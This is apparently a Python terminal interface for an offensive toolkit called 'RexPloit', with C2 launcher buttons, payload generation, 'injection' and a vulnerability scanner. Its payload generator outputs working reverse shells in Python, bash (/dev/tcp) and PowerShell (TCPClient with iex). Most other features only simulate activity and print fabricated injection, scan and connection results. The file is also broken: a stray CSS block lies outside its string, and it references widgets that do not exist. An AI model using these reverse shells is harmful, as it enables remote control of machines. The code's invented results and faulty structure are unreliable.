#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RexPloit - Advanced TUI Interface Enhancement
Provides improved UI components and navigation for the RexPloit framework
"""

import os
import sys
import time
import asyncio
from typing import List, Dict, Any, Optional

# Rich and Textual for advanced TUI
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.layout import Layout
from rich.syntax import Syntax
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm

from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical, Grid
from textual.reactive import reactive
from textual.widgets import (
    Header, Footer, Button, Static, Input, Label,
    Select, Switch, DataTable, Tree, TabbedContent, 
    TabPane, ListItem, ListView, Markdown, OptionList, 
    ContentSwitcher, Log as TextLog
)
from textual.widget import Widget
from textual.screen import Screen
from textual.css.query import NoMatches

# Custom styles for enhanced UI
REXPLOIT_CSS = """
/* Main application styling */
Screen {
    background: #0f0f1a;
    color: #e0e0e0;
    layout: vertical;
}

Header {
    background: linear-gradient(90deg, #1a1a2a 0%, #2a2a3a 100%);
    color: #e0e0e0;
    height: 3;
    padding: 0 1;
    dock: top;
    border: none;
}

Footer {
    background: linear-gradient(90deg, #1a1a2a 0%, #2a2a3a 100%);
    color: #e0e0e0;
    height: 3;
    dock: bottom;
    border: none;
}

/* Main container layout */
.app-layout {
    layout: horizontal;
    height: 100%;
    width: 100%;
}

#status-panel {
    background: #272736;
    border-right: tall #3d3d5c;
    width: 30;
    min-width: 25;
    max-width: 35;
    height: 100%;
}

#main-content {
    background: #20203a;
    width: 1fr;
    height: 100%;
}

#tools-panel {
    background: #272736;
    border-left: tall #3d3d5c;
    width: 30;
    min-width: 25;
    max-width: 35;
    height: 100%;
}

/* Status indicators and content styling */
.status-item {
    background: #3d3d5c;
    color: #e0e0e0;
    border: solid #5d5d9c;
    padding: 1;
    margin: 1 0;
    height: 3;
    content-align: left middle;
}

.status-active {
    border: solid #4ade80;
    background: #1f3f2f;
    color: #4ade80;
}

.status-inactive {
    border: solid #ef4444;
    background: #3f1f1f;
    color: #ef4444;
}

.panel-header {
    background: #3d3d5c;
    color: #e0e0e0;
    text-align: center;
    width: 100%;
    height: 3;
    content-align: center middle;
    margin-bottom: 1;
    border: solid #5d5d9c;
}

/* Tab content styling */
TabPane {
    background: #20203a;
    padding: 1;
    height: 100%;
    width: 100%;
}

TabbedContent {
    height: 100%;
    width: 100%;
    border: solid #3d3d5c;
}

/* Log areas */
TextLog {
    background: #1a1a2a;
    border: solid #3d3d5c;
    height: 100%;
    width: 100%;
    scrollbar-size-vertical: 1;
    margin: 1 0;
}

/* Button styling */
Button {
    margin: 1 0;
    height: 3;
    min-width: 15;
    width: 100%;
    background: #3d3d5c;
    color: #e0e0e0;
    border: solid #5d5d9c;
}

Button:hover {
    background: #4d4d7c;
    border: solid #6d6dac;
}

Button.primary {
    background: #3d5c3d;
    border: solid #4d7c4d;
}

Button.error {
    background: #5c3d3d;
    border: solid #7c4d4d;
}

/* Form elements */
Input {
    background: #2a2a4a;
    color: #e0e0e0;
    border: solid #3d3d5c;
    margin: 1 0;
    width: 100%;
    height: 3;
}

Select {
    background: #2a2a4a;
    color: #e0e0e0;
    border: solid #3d3d5c;
    margin: 1 0;
    width: 100%;
    height: 3;
}

Label {
    color: #e0e0e0;
    margin: 1 0;
    height: 1;
}

/* Horizontal layouts */
Horizontal {
    height: 100%;
    width: 100%;
}

Vertical {
    height: 100%;
    width: 100%;
}
"""

/* Status indicators and content styling */
.status-item {
    background: #3d3d5c;
    color: #e0e0e0;
    border: solid #5d5d9c;
    padding: 1;
    margin: 1 0;
    height: auto;
    min-height: 3;
}

.status-active {
    border: solid #4ade80;
    background: #1f2937;
}

.status-inactive {
    border: solid #ef4444;
    background: #1f1f2e;
}

.panel-header {
    background: #3d3d5c;
    color: #e0e0e0;
    text-align: center;
    width: 100%;
    height: 3;
    content-align: center middle;
    margin-bottom: 1;
}

/* Tab content styling */
TabPane {
    background: #20203a;
    padding: 1;
    height: 100%;
}

TabbedContent {
    height: 100%;
}

/* Log areas */
TextLog {
    background: #1a1a2a;
    border: solid #3d3d5c;
    height: 100%;
    scrollbar-size-vertical: 1;
}

/* Button styling */
Button {
    margin: 1 0;
    height: 3;
    min-width: 15;
}

/* Grid layouts */
.status-indicator {
    width: 100%;
    padding: 1;
    margin-bottom: 1;
    background: #272736;
    border: solid #3d3d5c;
}

.status-active {
    background: #3d5c3d;
    color: #e0e0e0;
    border: solid #5c8c5c;
}

.status-inactive {
    background: #5c3d3d;
    color: #e0e0e0;
    border: solid #8c5c5c;
}

/* Data tables */
DataTable {
    width: 100%;
    height: 100%;
    border: tall #3d3d5c;
}

/* Tabs and content */
TabbedContent {
    background: #20203a;
    border: solid #3d3d5c;
}

TabPane {
    padding: 1;
}

/* Buttons */
Button {
    margin: 1 1;
    min-width: 10;
    background: #3d3d5c;
    color: #e0e0e0;
}

Button:hover {
    background: #4d4d7c;
}

Button.primary {
    background: #3d5c3d;
    color: #e0e0e0;
}

Button.primary:hover {
    background: #4d7c4d;
}

Button.danger {
    background: #5c3d3d;
    color: #e0e0e0;
}

Button.danger:hover {
    background: #7c4d4d;
}

/* Forms and inputs */
Input {
    background: #2a2a4a;
    color: #e0e0e0;
    border: solid #3d3d5c;
    margin: 1 0;
    width: 100%;
}

Select {
    background: #2a2a4a;
    color: #e0e0e0;
    border: solid #3d3d5c;
    margin: 1 0;
    width: 100%;
}

/* Logs */
Log {
    background: #1a1a2a;
    color: #e0e0e0;
    border: solid #3d3d5c;
    height: 100%;
    overflow-y: scroll;
}

/* Progress indicators */
.progress-bar {
    background: #3d3d5c;
    color: #e0e0e0;
    height: 1;
}

/* Custom panels */
.panel {
    background: #272736;
    border: solid #3d3d5c;
    padding: 1;
    margin: 1;
}

.panel-header {
    background: #3d3d5c;
    color: #e0e0e0;
    text-align: center;
    width: 100%;
    padding: 1;
    margin-bottom: 1;
}

/* Tool details */
.tool-card {
    background: #272736;
    border: solid #3d3d5c;
    padding: 1;
    margin: 1;
    width: 100%;
}

.tool-card-header {
    background: #3d3d5c;
    color: #e0e0e0;
    text-align: center;
    width: 100%;
    padding: 1;
    margin-bottom: 1;
}

/* Forms */
#form-container {
    width: 100%;
    padding: 1;
}

.form-group {
    margin-bottom: 1;
    width: 100%;
}

.form-label {
    margin-bottom: 1;
    color: #e0e0e0;
}

/* Tooltips */
.tooltip {
    background: #1a1a2a;
    color: #e0e0e0;
    padding: 1;
    border: solid #3d3d5c;
}
"""

class StatusPanel(Static):
    """Enhanced status panel for RexPloit"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.status_items = {}
        
    def compose(self) -> ComposeResult:
        """Compose status panel"""
        yield Static("RexPloit Status", classes="panel-header")
        
        yield Static("C2: ✗ Not running", id="status-c2", classes="status-item status-inactive")
        yield Static("Listener: ✗ Not running", id="status-listener", classes="status-item status-inactive")
        yield Static("Payloads: ✗ 0 generated", id="status-payloads", classes="status-item status-inactive")
        yield Static("Connections: ✗ 0 active", id="status-connections", classes="status-item status-inactive")
        yield Static("Targets: ✗ 0 defined", id="status-targets", classes="status-item status-inactive")
            
        yield TextLog(id="status-log", highlight=True)
        
    def update_status(self, key, value, active=False):
        """Update status panel item"""
        self.status_items[key] = (value, active)
        self._refresh_status()
        
    def log_status(self, message, level="INFO"):
        """Add message to status log"""
        try:
            log = self.query_one("#status-log")
            timestamp = time.strftime("%H:%M:%S")
            
            if level == "INFO":
                log.write(f"[dim]{timestamp}[/dim] [blue]{message}[/blue]")
            elif level == "SUCCESS":
                log.write(f"[dim]{timestamp}[/dim] [green]{message}[/green]")
            elif level == "WARNING":
                log.write(f"[dim]{timestamp}[/dim] [yellow]{message}[/yellow]")
            elif level == "ERROR":
                log.write(f"[dim]{timestamp}[/dim] [red]{message}[/red]")
            else:
                log.write(f"[dim]{timestamp}[/dim] {message}")
        except NoMatches:
            pass
            
    def _refresh_status(self):
        """Refresh all status indicators"""
        for key, (value, active) in self.status_items.items():
            try:
                widget = self.query_one(f"#status-{key}")
                status_icon = "✓" if active else "✗"
                widget.update(f"{key.capitalize()}: {status_icon} {value}")
                widget.remove_class("status-active")
                widget.remove_class("status-inactive")
                widget.add_class("status-active" if active else "status-inactive")
            except NoMatches:
                pass

class MainContentArea(Container):
    """Main content area with multi-tab interface"""
    
    def compose(self) -> ComposeResult:
        """Compose main content area"""
        with TabbedContent(id="main-tabs"):
            with TabPane("Dashboard", id="tab-dashboard"):
                yield Static("RexPloit Dashboard", classes="panel-header")
                with Vertical():
                    with Horizontal():
                        yield Static("System Status: Online", classes="status-item status-active")
                        yield Static("Framework: Ready", classes="status-item status-active")
                    with Horizontal():
                        yield Static("Recent Activity", classes="panel-header")
                    yield TextLog(id="dashboard-log", highlight=True)
            
            with TabPane("C2 Manager", id="tab-c2"):
                yield Static("C2 Framework Management", classes="panel-header")
                with Horizontal():
                    with Vertical(id="c2-controls"):
                        yield Button("Start Sliver", id="start-sliver", variant="primary")
                        yield Button("Start Villain", id="start-villain", variant="primary")
                        yield Button("Start HoaxShell", id="start-hoaxshell", variant="primary")
                        yield Button("Stop Framework", id="stop-framework", variant="error")
                    with Vertical(id="c2-output"):
                        yield Static("C2 Output", classes="panel-header")
                        yield TextLog(id="c2-log", highlight=True)
            
            with TabPane("Payloads", id="tab-payloads"):
                yield Static("Payload Generation", classes="panel-header")
                with Horizontal():
                    with Vertical(id="payload-form"):
                        yield Static("Payload Options", classes="panel-header")
                        yield Label("Payload Type:")
                        yield Select(
                            ((pt, pt) for pt in [
                                "python_reverse_tcp",
                                "bash_reverse_tcp", 
                                "powershell_reverse_tcp",
                                "php_reverse_tcp"
                            ]),
                            id="payload-type"
                        )
                        yield Label("Listener Host:")
                        yield Input(placeholder="0.0.0.0", id="listener-host")
                        yield Label("Listener Port:")
                        yield Input(placeholder="4444", id="listener-port")
                        yield Button("Generate Payload", id="generate-payload", variant="primary")
                    with Vertical(id="payload-output"):
                        yield Static("Generated Payloads", classes="panel-header")
                        yield TextLog(id="payload-log", highlight=True)
            
            with TabPane("Injection", id="tab-injection"):
                yield Static("Payload Injection", classes="panel-header")
                with Horizontal():
                    with Vertical(id="injection-targets"):
                        yield Static("Targets", classes="panel-header")
                        yield Input(placeholder="Add target...", id="add-target")
                        yield Button("Add Target", id="add-target-btn")
                        yield Button("Inject Payloads", id="inject-payloads", variant="error")
                    with Vertical(id="injection-results"):
                        yield Static("Injection Results", classes="panel-header")
                        yield TextLog(id="injection-log", highlight=True)
            
            with TabPane("Scanner", id="tab-scanner"):
                yield Static("Vulnerability Scanner", classes="panel-header")
                with Horizontal():
                    with Vertical(id="scanner-controls"):
                        yield Static("Scan Options", classes="panel-header")
                        yield Label("Target:")
                        yield Input(placeholder="https://example.com", id="scan-target")
                        yield Button("Run Scan", id="run-scan", variant="error")
                    with Vertical(id="scanner-results"):
                        yield Static("Scan Results", classes="panel-header")
                        yield TextLog(id="scanner-log", highlight=True)
            
            with TabPane("Reports", id="tab-reports"):
                yield Static("Security Reports", classes="panel-header")
                with Horizontal():
                    with Vertical(id="report-list", classes="panel"):
                        yield Static("Available Reports", classes="panel-header")
                        yield ListView(id="reports-listview")
                    with Vertical(id="report-content", classes="panel"):
                        yield TextLog(id="report-log", highlight=True)
                        
            with TabPane("Settings", id="tab-settings"):
                yield Static("RexPloit Settings", classes="panel-header")
                with Grid(id="settings-grid"):
                    with Vertical(id="general-settings", classes="panel"):
                        yield Static("General Settings", classes="panel-header")
                        yield Label("Default C2 Framework:", classes="form-label")
                        yield Select(
                            ((c2, c2) for c2 in ["sliver", "villain", "hoaxshell"]),
                            id="default-c2"
                        )
                        yield Label("Listener Host:", classes="form-label")
                        yield Input(placeholder="0.0.0.0", id="default-host")
                        yield Label("Listener Port:", classes="form-label")
                        yield Input(placeholder="4444", id="default-port")
                        yield Button("Save Settings", id="save-settings", variant="primary")
                    
                    with Vertical(id="dependency-manager", classes="panel"):
                        yield Static("Dependency Manager", classes="panel-header")
                        yield Button("Check Dependencies", id="check-deps")
                        yield Button("Install Dependencies", id="install-deps")
                        yield Button("Create Contingency Tools", id="create-contingency")

class ToolsPanel(Static):
    """Tools panel for quick actions and tools"""
    
    def compose(self) -> ComposeResult:
        """Compose tools panel"""
        yield Static("Quick Tools", classes="panel-header")
        
        yield Static("Network Scanner", classes="panel-header")
        yield Button("Scan Network", id="quick-scan-network")
        
        yield Static("Payload Generator", classes="panel-header")
        yield Button("Python Payload", id="quick-python-payload")
        yield Button("PowerShell Payload", id="quick-ps-payload")
        
        yield Static("Listeners", classes="panel-header")
        yield Button("Listener (4444)", id="quick-listener-4444")
        yield Button("Listener (8080)", id="quick-listener-8080")
        
        yield Static("Utilities", classes="panel-header")
        yield Button("Check Target", id="quick-check-target")
        yield Button("Generate Report", id="quick-generate-report")

class RexPloitEnhancedApp(App):
    """Enhanced RexPloit Application with Advanced UI"""
    
    CSS = REXPLOIT_CSS
    
    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("d", "switch_tab('tab-dashboard')", "Dashboard"),
        Binding("c", "switch_tab('tab-c2')", "C2 Manager"),
        Binding("p", "switch_tab('tab-payloads')", "Payloads"),
        Binding("i", "switch_tab('tab-injection')", "Injection"),
        Binding("s", "switch_tab('tab-scanner')", "Scanner"),
        Binding("r", "switch_tab('tab-reports')", "Reports"),
        Binding("t", "switch_tab('tab-settings')", "Settings"),
        Binding("f1", "show_help", "Help")
    ]
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.targets = []
        
    def compose(self) -> ComposeResult:
        """Compose the app layout"""
        yield Header()
        
        with Container(classes="app-layout"):
            yield StatusPanel(id="status-panel")
            yield MainContentArea(id="main-content")
            yield ToolsPanel(id="tools-panel")
            
        yield Footer()
        
    def on_mount(self) -> None:
        """Handle app mount event"""
        # Set initial status
        status_panel = self.query_one(StatusPanel)
        status_panel.update_status("c2", "Not running", active=False)
        status_panel.update_status("listener", "Not running", active=False)
        status_panel.update_status("payloads", "0 generated", active=False)
        status_panel.update_status("connections", "0 active", active=False)
        status_panel.update_status("targets", "0 defined", active=False)
        
        # Log startup
        status_panel.log_status("RexPloit Enhanced UI initialized", "SUCCESS")
        status_panel.log_status("Ready for professional penetration testing operations", "INFO")
        
    def action_switch_tab(self, tab_id: str) -> None:
        """Switch to specified tab"""
        try:
            tabs = self.query_one("#main-tabs")
            tabs.active = tab_id
            
            # Log tab switch
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status(f"Switched to {tab_id.replace('tab-', '').capitalize()}", "INFO")
        except NoMatches:
            pass
            
    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button press events"""
        button_id = event.button.id
        status_panel = self.query_one(StatusPanel)
        
        # C2 Framework buttons
        if button_id == "start-sliver":
            status_panel.log_status("Starting Sliver C2 Framework...", "INFO")
            status_panel.update_status("c2", "Sliver running", active=True)
            self._simulate_c2_startup("Sliver")
            
        elif button_id == "start-villain":
            status_panel.log_status("Starting Villain C2 Framework...", "INFO")
            status_panel.update_status("c2", "Villain running", active=True)
            self._simulate_c2_startup("Villain")
            
        elif button_id == "start-hoaxshell":
            status_panel.log_status("Starting HoaxShell C2 Framework...", "INFO")
            status_panel.update_status("c2", "HoaxShell running", active=True)
            self._simulate_c2_startup("HoaxShell")
            
        elif button_id == "stop-framework":
            status_panel.log_status("Stopping C2 Framework...", "INFO")
            status_panel.update_status("c2", "Not running", active=False)
            status_panel.update_status("listener", "Not running", active=False)
            self._log_to_area("c2-log", "[yellow]Framework stopped[/yellow]")
            
        # Payload buttons
        elif button_id == "generate-payload":
            self._handle_payload_generation()
            
        # Injection buttons
        elif button_id == "add-target-btn":
            self._add_target()
            
        elif button_id == "inject-payloads":
            self._handle_payload_injection()
            
        # Scanner buttons
        elif button_id == "run-scan":
            self._handle_vulnerability_scan()
            
        # Settings buttons
        elif button_id == "save-settings":
            self._save_settings()
            
        elif button_id == "check-deps":
            status_panel.log_status("Checking dependencies...", "INFO")
            self._simulate_dependency_check()
            
        elif button_id == "install-deps":
            status_panel.log_status("Installing dependencies...", "INFO")
            self._simulate_dependency_installation()
            
        # Quick tools buttons
        elif button_id == "quick-scan-network":
            status_panel.log_status("Running quick network scan...", "INFO")
            self._simulate_network_scan()
            
        elif button_id == "quick-python-payload":
            self._generate_quick_payload("python_reverse_tcp")
            
        elif button_id == "quick-ps-payload":
            self._generate_quick_payload("powershell_reverse_tcp")
            
        elif button_id == "quick-bash-payload":
            self._generate_quick_payload("bash_reverse_tcp")
            
        elif button_id == "quick-listener-4444":
            status_panel.log_status("Starting quick listener on port 4444...", "INFO")
            status_panel.update_status("listener", "Running on :4444", active=True)
            self._log_to_area("c2-log", "[green]Quick listener started on port 4444[/green]")
            
    def _simulate_c2_startup(self, framework_name):
        """Simulate C2 framework startup with logs"""
        c2_log = self.query_one("#c2-log")
        c2_log.clear()
        
        c2_log.write(f"[bold blue][{framework_name}][/bold blue] Initializing professional C2 framework...")
        
        # Schedule startup messages
        def add_startup_message(delay, message):
            def _add_message():
                c2_log.write(message)
            self.set_timer(delay, _add_message)
        
        add_startup_message(0.5, f"[bold blue][{framework_name}][/bold blue] Checking dependencies...")
        add_startup_message(1.0, f"[bold blue][{framework_name}][/bold blue] Initializing server...")
        add_startup_message(1.5, f"[bold blue][{framework_name}][/bold blue] Starting listener...")
        add_startup_message(2.0, f"[bold green][{framework_name}][/bold green] Framework operational!")
        
        # Update status after delay
        def update_listener_status():
            status_panel = self.query_one(StatusPanel)
            status_panel.update_status("listener", "Running on :4444", active=True)
            status_panel.log_status(f"{framework_name} C2 framework ready", "SUCCESS")
            
        self.set_timer(2.5, update_listener_status)
        
    def _handle_payload_generation(self):
        """Handle payload generation"""
        # Get input values
        try:
            payload_type = self.query_one("#payload-type").value
            host = self.query_one("#listener-host").value or "0.0.0.0"
            port = self.query_one("#listener-port").value or "4444"
            encode = self.query_one("#encode-payload").value
            obfuscate = self.query_one("#obfuscate-payload").value
            
            # Log generation
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status(f"Generating {payload_type} payload...", "INFO")
            
            # Simulate payload generation
            payload_log = self.query_one("#payload-log")
            payload_log.clear()
            
            payload_log.write(f"[bold blue]Generating {payload_type} payload[/bold blue]")
            payload_log.write(f"Host: {host}")
            payload_log.write(f"Port: {port}")
            payload_log.write(f"Encoding: {'Enabled' if encode else 'Disabled'}")
            payload_log.write(f"Obfuscation: {'Enabled' if obfuscate else 'Disabled'}")
            
            # Generate example payload
            payload_content = self._generate_payload_content(payload_type, host, port)
            
            # Update payload log
            def show_payload():
                payload_name = f"rexploit_payload_{int(time.time())}"
                payload_log.write("")
                payload_log.write("[bold green]Payload generated successfully![/bold green]")
                payload_log.write(f"Saved as: [bold]{payload_name}.txt[/bold]")
                payload_log.write("")
                payload_log.write("[bold]Payload Content:[/bold]")
                payload_log.write(payload_content)
                
                # Update status
                status_panel = self.query_one(StatusPanel)
                current_payloads = int(status_panel.status_items.get("payloads", (0, False))[0].split()[0]) + 1
                status_panel.update_status("payloads", f"{current_payloads} generated", active=True)
                status_panel.log_status(f"Payload '{payload_name}' generated successfully", "SUCCESS")
                
            self.set_timer(1.0, show_payload)
            
        except Exception as e:
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status(f"Error generating payload: {str(e)}", "ERROR")
            
    def _generate_payload_content(self, payload_type, host, port):
        """Generate payload content based on type"""
        if payload_type == "python_reverse_tcp":
            return f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])"""
        elif payload_type == "bash_reverse_tcp":
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        elif payload_type == "powershell_reverse_tcp":
            return f"""$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}};
$client.Close()"""
        else:
            return f"# {payload_type} payload for {host}:{port}"
            
    def _add_target(self):
        """Add target to the targets list"""
        target_input = self.query_one("#add-target")
        target_value = target_input.value.strip()
        
        if target_value and target_value not in self.targets:
            self.targets.append(target_value)
            target_input.value = ""
            
            # Update target list
            target_list = self.query_one("#target-list")
            target_list.clear()
            
            for target in self.targets:
                target_list.append(ListItem(target))
                
            # Update status
            status_panel = self.query_one(StatusPanel)
            status_panel.update_status("targets", f"{len(self.targets)} defined", active=len(self.targets) > 0)
            status_panel.log_status(f"Added target: {target_value}", "INFO")
            
    def _handle_payload_injection(self):
        """Handle payload injection to targets"""
        if not self.targets:
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status("No targets defined for injection", "ERROR")
            self._log_to_area("injection-log", "[bold red]Error: No targets defined[/bold red]")
            return
            
        # Log injection start
        status_panel = self.query_one(StatusPanel)
        status_panel.log_status(f"Injecting payloads to {len(self.targets)} targets...", "INFO")
        
        # Clear injection log
        injection_log = self.query_one("#injection-log")
        injection_log.clear()
        
        # Show targets
        injection_log.write("[bold blue]Starting professional payload injection[/bold blue]")
        injection_log.write("Targets:")
        for target in self.targets:
            injection_log.write(f"  - {target}")
        
        # Simulate injection process
        def simulate_injection():
            injection_log.write("")
            injection_log.write("[bold]Deploying payloads...[/bold]")
            
            # Process each target
            for i, target in enumerate(self.targets):
                # Add slight delay between targets
                def process_target(target_idx, target_url):
                    # Simulate multiple injection vectors
                    vectors = ["command_injection", "file_upload", "sql_injection"]
                    results = []
                    
                    for vector in vectors:
                        success = (target_idx + ord(vector[0])) % 5 != 0  # 80% success rate
                        status = "delivered" if success else "no_callback"
                        results.append((vector, status))
                        
                    # Log results for this target
                    injection_log.write(f"\n[bold]Target: {target_url}[/bold]")
                    for vector, status in results:
                        color = "green" if status == "delivered" else "red"
                        injection_log.write(f"  Vector: {vector} - [{color}]{status}[/{color}]")
                
                self.set_timer(0.8 * i, lambda idx=i, url=target: process_target(idx, url))
            
            # Final results after all targets processed
            def show_final_results():
                injection_log.write("\n[bold green]Injection complete![/bold green]")
                injection_log.write(f"Processed {len(self.targets)} targets")
                injection_log.write("See detailed results above")
                
                # Update status
                status_panel = self.query_one(StatusPanel)
                status_panel.log_status("Payload injection completed", "SUCCESS")
                
                # Simulate some connections
                self.set_timer(2.0, self._simulate_incoming_connection)
                
            self.set_timer(0.8 * len(self.targets) + 0.5, show_final_results)
            
        self.set_timer(1.0, simulate_injection)
        
    def _handle_vulnerability_scan(self):
        """Handle vulnerability scanning"""
        scan_target = self.query_one("#scan-target").value
        
        if not scan_target:
            self._log_to_area("scanner-log", "[bold red]Error: No target specified[/bold red]")
            return
            
        # Log scan start
        status_panel = self.query_one(StatusPanel)
        status_panel.log_status(f"Scanning target: {scan_target}", "INFO")
        
        # Clear scanner log
        scanner_log = self.query_one("#scanner-log")
        scanner_log.clear()
        
        # Show scan start
        scanner_log.write(f"[bold blue]Starting professional vulnerability scan[/bold blue]")
        scanner_log.write(f"Target: {scan_target}")
        scanner_log.write("Initializing scanner...")
        
        # Simulate scan process
        vulnerabilities = [
            ("Remote Code Execution", "Critical", 9.8),
            ("SQL Injection", "High", 8.5),
            ("Cross-Site Scripting", "Medium", 6.4),
            ("File Inclusion", "High", 7.8),
            ("Command Injection", "Critical", 9.3)
        ]
        
        def simulate_scan():
            scanner_log.write("\n[bold]Scanning for vulnerabilities...[/bold]")
            
            # Process each vulnerability check
            for i, (vuln, severity, score) in enumerate(vulnerabilities):
                # Add slight delay between checks
                def check_vulnerability(v, s, c):
                    # Simulate detection with 60% success rate
                    detected = random.random() > 0.4
                    
                    if detected:
                        color = "red" if s == "Critical" else "orange" if s == "High" else "yellow"
                        scanner_log.write(f"  [{color}]{s}[/{color}] {v} (CVSS: {c}) - DETECTED")
                    
                self.set_timer(0.8 * i, lambda vuln=vuln, sev=severity, score=score: check_vulnerability(vuln, sev, score))
            
            # Final results after all checks
            def show_final_results():
                scanner_log.write("\n[bold green]Scan complete![/bold green]")
                scanner_log.write(f"Vulnerabilities found in {scan_target}")
                
                # Update status
                status_panel = self.query_one(StatusPanel)
                status_panel.log_status(f"Vulnerability scan of {scan_target} completed", "SUCCESS")
                
            self.set_timer(0.8 * len(vulnerabilities) + 0.5, show_final_results)
            
        self.set_timer(1.0, simulate_scan)
        
    def _save_settings(self):
        """Save application settings"""
        try:
            default_c2 = self.query_one("#default-c2").value
            default_host = self.query_one("#default-host").value or "0.0.0.0"
            default_port = self.query_one("#default-port").value or "4444"
            
            # Update status
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status("Settings saved successfully", "SUCCESS")
            
        except Exception as e:
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status(f"Error saving settings: {str(e)}", "ERROR")
            
    def _simulate_dependency_check(self):
        """Simulate dependency checking"""
        self._log_to_area("status-log", "[bold blue]Checking dependencies...[/bold blue]")
        
        def check_packages():
            self._log_to_area("status-log", "✓ Python packages: All installed")
            
        def check_c2():
            self._log_to_area("status-log", "✓ C2 frameworks: All installed")
            
        def check_tools():
            self._log_to_area("status-log", "✓ System tools: All installed")
            
        def check_complete():
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status("All dependencies satisfied", "SUCCESS")
            
        self.set_timer(0.5, check_packages)
        self.set_timer(1.0, check_c2)
        self.set_timer(1.5, check_tools)
        self.set_timer(2.0, check_complete)
        
    def _simulate_dependency_installation(self):
        """Simulate dependency installation"""
        self._log_to_area("status-log", "[bold blue]Installing dependencies...[/bold blue]")
        
        def install_packages():
            self._log_to_area("status-log", "✓ Installing Python packages...")
            
        def install_c2():
            self._log_to_area("status-log", "✓ Installing C2 frameworks...")
            
        def install_tools():
            self._log_to_area("status-log", "✓ Installing system tools...")
            
        def install_complete():
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status("All dependencies installed successfully", "SUCCESS")
            
        self.set_timer(0.5, install_packages)
        self.set_timer(1.5, install_c2)
        self.set_timer(2.5, install_tools)
        self.set_timer(3.0, install_complete)
        
    def _simulate_network_scan(self):
        """Simulate network scanning"""
        self._log_to_area("status-log", "[bold blue]Scanning local network...[/bold blue]")
        
        def find_hosts():
            self._log_to_area("status-log", "Found 5 hosts on local network")
            
        def port_scan():
            self._log_to_area("status-log", "Port scanning hosts...")
            
        def service_detection():
            self._log_to_area("status-log", "Detecting services...")
            
        def scan_complete():
            hosts = ["192.168.1.1 (Router)", "192.168.1.100", "192.168.1.101", "192.168.1.105", "192.168.1.110"]
            status_panel = self.query_one(StatusPanel)
            status_panel.log_status(f"Network scan complete, found {len(hosts)} hosts", "SUCCESS")
            
            for host in hosts:
                self._log_to_area("status-log", f"  - {host}")
            
        self.set_timer(0.5, find_hosts)
        self.set_timer(1.0, port_scan)
        self.set_timer(2.0, service_detection)
        self.set_timer(2.5, scan_complete)
        
    def _generate_quick_payload(self, payload_type):
        """Generate quick payload of specified type"""
        status_panel = self.query_one(StatusPanel)
        status_panel.log_status(f"Generating quick {payload_type}...", "INFO")
        
        host = "0.0.0.0"
        port = "4444"
        
        # Generate payload
        payload_content = self._generate_payload_content(payload_type, host, port)
        payload_name = f"quick_{payload_type}_{int(time.time())}"
        
        # Log generation
        self._log_to_area("status-log", f"[green]Generated quick {payload_type} payload: {payload_name}[/green]")
        
        # Update status
        current_payloads = int(status_panel.status_items.get("payloads", (0, False))[0].split()[0]) + 1
        status_panel.update_status("payloads", f"{current_payloads} generated", active=True)
        
    def _simulate_incoming_connection(self):
        """Simulate incoming connection"""
        status_panel = self.query_one(StatusPanel)
        
        # Update connection count
        current_connections = int(status_panel.status_items.get("connections", (0, False))[0].split()[0]) + 1
        status_panel.update_status("connections", f"{current_connections} active", active=True)
        
        # Log connection
        source_ip = f"192.168.1.{random.randint(100, 200)}"
        status_panel.log_status(f"New connection from {source_ip}:49152", "SUCCESS")
        self._log_to_area("c2-log", f"[bold green][CONNECTION][/bold green] Established from {source_ip}:49152")
        
    def _log_to_area(self, area_id, message):
        """Log message to specific area"""
        try:
            log_area = self.query_one(f"#{area_id}")
            if hasattr(log_area, "write"):
                log_area.write(message)
        except NoMatches:
            pass

# Main function to run the enhanced app
def run_enhanced_app():
    """Run the enhanced RexPloit application"""
    app = RexPloitEnhancedApp()
    app.run()

# Run the app if executed directly
if __name__ == "__main__":
    import random  # For simulation purposes
    run_enhanced_app()